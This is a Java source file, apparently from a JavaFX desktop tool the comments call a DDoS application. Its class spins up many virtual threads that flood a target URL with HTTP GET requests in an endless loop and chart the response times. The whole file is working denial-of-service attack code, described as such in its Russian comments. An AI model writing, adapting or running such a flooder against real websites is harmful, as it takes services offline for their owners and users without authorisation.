package org.ddoser.ddoserdesktop.algorithm;

import static org.ddoser.ddoserdesktop.algorithm.LineChartAlgorithm.addDataToDdosSeries;
import static org.ddoser.ddoserdesktop.util.AlertService.showAlert;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

import org.ddoser.ddoserdesktop.context.ApplicationContext;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.client.RestTemplate;

import javafx.application.Platform;
import javafx.scene.control.Alert;

/**
 * Утилитарный класс с алгоритмами для ДДОС'а
 */
public class DDOSAlgorithm {

  /**
   * Логгер
   */
  private static final Logger log = LoggerFactory.getLogger(DDOSAlgorithm.class);
  /**
   * Счетчик количества запросов
   */
  private static final AtomicInteger COUNTER = new AtomicInteger(0);
  /**
   * Признак необходимости продолжения отправки запросов
   */
  private static final AtomicBoolean NEED_SEND = new AtomicBoolean(false);
  /**
   * Признак наличия уведомления об ошибке
   */
  private static final AtomicBoolean NOTIFICATION_SHOW = new AtomicBoolean(false);

  /**
   * Конструктор
   */
  private DDOSAlgorithm() {
  }

  /**
   * Начать ДДОС
   *
   * @param virtualThreadsCount количество создаваемых виртуальных потоков
   * @param url                 адрес, который ДДОС'им
   */
  public static void startDDOS(int virtualThreadsCount, String url) {
    NOTIFICATION_SHOW.set(false);
    NEED_SEND.set(true);
    try (ExecutorService executor = Executors.newVirtualThreadPerTaskExecutor()) {
      for (int i = 0; i < virtualThreadsCount; i++) {
        executor.submit(() -> {
          while (NEED_SEND.get()) {
            int taskNumber = COUNTER.incrementAndGet();
            log.debug("Running task %s".formatted(taskNumber));
            performTask(url, taskNumber);
          }
        });
      }
    }

    try {
      Thread.currentThread().join();
    } catch (InterruptedException e) {
      Thread.currentThread().interrupt();
    }
  }

  /**
   * Остановить ДДОС
   */
  public static void stopSend() {
    NEED_SEND.set(false);
  }

  /**
   * Выполнить запрос
   *
   * @param url        адрес для запроса
   * @param taskNumber номер задачи
   */
  private static void performTask(String url, int taskNumber) {
    long begin = System.currentTimeMillis();
    try {
      new RestTemplate().getForObject(url, String.class);
    } catch (Exception e) {
      NEED_SEND.set(false);
      if (NOTIFICATION_SHOW.compareAndSet(false, true)) {
        Platform.runLater(() -> {
          ApplicationContext.mainPageContext().stopDDOSState();
          showAlert(Alert.AlertType.ERROR, "Ошибка",
            "Произошла ошибка при доступе к ресурсу: %1.100s".formatted(e.getMessage()));
        });
      }
      return;
    }
    long duration = System.currentTimeMillis() - begin;
    addDataToDdosSeries(duration, taskNumber);
    log.debug("Затрачено времени: {} ms", duration);
  }
}
